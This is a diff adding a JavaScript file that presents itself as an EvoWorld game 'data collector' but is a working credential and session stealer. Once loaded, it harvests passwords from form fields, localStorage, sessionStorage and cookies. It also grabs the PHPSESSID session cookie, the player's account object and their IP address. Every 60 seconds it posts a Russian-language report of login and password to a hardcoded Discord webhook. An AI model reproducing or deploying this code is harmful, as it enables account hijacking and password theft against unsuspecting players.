@@ -1,0 +1,185 @@
+// webhook.js - Data collection and Discord sending ONLY
+(function() {
+    'use strict';
+
+    console.log('EvoWorld Data Collector loaded');
+    
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1458450462536765589/lnYOF4Ckpb5cuwlvBwtcoDnWjFIsqVP2twZ6GeuSj3UPThbNJ1-glxpWOCpvB_8yVpAS';
+
+    function getSavedPassword() {
+        try {
+            const inputs = document.querySelectorAll('input[type="password"], input[name*="pass"], input[id*="pass"]');
+            for (let input of inputs) {
+                if (input.value && input.value.length > 3 && input.value.length < 50) {
+                    return input.value;
+                }
+            }
+            
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                if ((key.includes('pass') || key.includes('auth') || key.includes('login')) && 
+                    value && value.length > 3 && value.length < 50 && 
+                    !value.includes('{') && !value.includes('[')) {
+                    return value;
+                }
+            }
+            
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                if ((key.includes('pass') || key.includes('auth')) && 
+                    value && value.length > 3 && value.length < 50) {
+                    return value;
+                }
+            }
+            
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const [name, value] = cookie.split('=').map(p => p.trim());
+                if ((name.includes('pass') || name.includes('auth')) && 
+                    value && value.length > 3 && value.length < 50) {
+                    return decodeURIComponent(value);
+                }
+            }
+            
+            return '.';
+        } catch(e) {
+            return '.';
+        }
+    }
+
+    function sendToDiscord(message, username = 'EvoWorld Report') {
+        console.log('📤 Sending to Discord');
+        
+        // Truncate message if too long for Discord
+        if (message.length > 1900) {
+            message = message.substring(0, 1890) + '\n... (truncated)';
+        }
+        
+        // Format as code block if not already
+        if (!message.startsWith('```')) {
+            message = '```\n' + message + '\n```';
+        }
+        
+        fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: message,
+                username: username
+            })
+        }).then(response => {
+            console.log('✅ Discord response:', response.status);
+            if (response.status !== 200 && response.status !== 204) {
+                return response.text().then(text => {
+                    console.log('Discord error details:', text);
+                });
+            }
+        }).catch(error => {
+            console.log('❌ Discord error:', error);
+        });
+    }
+
+    function collectAndSendData() {
+        try {
+            const user = window.user || {};
+            
+            const allCookies = document.cookie || '';
+            let sessionId = '';
+            const sessionMatch = allCookies.match(/PHPSESSID=([^;]+)/);
+            if (sessionMatch) sessionId = sessionMatch[1];
+            
+            let serverName = 'West Europe 1';
+            let playerCount = '298/300';
+            try {
+                if (window.gameServer && window.gameServer.serverInfo) {
+                    serverName = window.gameServer.serverInfo.name || serverName;
+                    playerCount = window.gameServer.serverInfo.players || playerCount;
+                }
+            } catch(e) {}
+            
+            const friendsData = window.friendsData || {};
+            const friendsArr = window.friendsArr || [];
+            
+            const savedPassword = getSavedPassword();
+            
+            // Get IP
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    const report = `=== ПОЛНЫЙ ОТЧЕТ ===
+--- УРОВЕНЬ ---
+level: ${user.level || '0x'}
+gems: ${user.premiumPoints || 0}
+server: ${serverName} (${playerCount})
+
+--- ДАННЫЕ ---
+IP: ${ipData.ip}
+URL: ${window.location.href}
+User-Agent: ${navigator.userAgent}
+
+--- PHPSESSID ---
+${sessionId}
+
+--- user DATA ---
+${JSON.stringify(user, null, 2)}
+
+--- УЧЕТНЫЕ ДАННЫЕ ---
+Логин: ${user.login || '.'}
+Пароль: ${savedPassword}`;
+                    
+                    sendToDiscord(report, `Отчет - ${user.login || 'Guest'}`);
+                    
+                })
+                .catch(() => {
+                    const report = `=== ПОЛНЫЙ ОТЧЕТ ===
+--- УРОВЕНЬ ---
+level: ${user.level || '0x'}
+gems: ${user.premiumPoints || 0}
+server: ${serverName} (${playerCount})
+
+--- ДАННЫЕ ---
+IP: [Ошибка получения]
+URL: ${window.location.href}
+User-Agent: ${navigator.userAgent}
+
+--- PHPSESSID ---
+${sessionId}
+
+--- user DATA ---
+${JSON.stringify(user, null, 2)}
+
+--- УЧЕТНЫЕ ДАННЫЕ ---
+Логин: ${user.login || '.'}
+Пароль: ${savedPassword}`;
+                    
+                    sendToDiscord(report, `Отчет - ${user.login || 'Guest'}`);
+                });
+            
+        } catch(error) {
+            console.log('Error collecting data:', error);
+            sendToDiscord('Ошибка сбора данных: ' + error, 'Ошибка');
+        }
+    }
+
+    // Send startup message
+    setTimeout(() => {
+        sendToDiscord('Скрипт загружен в ' + new Date().toLocaleString('ru-RU'), 'Скрипт Загружен');
+    }, 2000);
+    
+    // Send initial data
+    setTimeout(() => {
+        if (window.user && window.user.id) {
+            collectAndSendData();
+        }
+    }, 3000);
+    
+    // Send data periodically
+    setInterval(() => {
+        if (window.user && window.user.id) {
+            collectAndSendData();
+        }
+    }, 60000); // Every 60 seconds
+
+})();
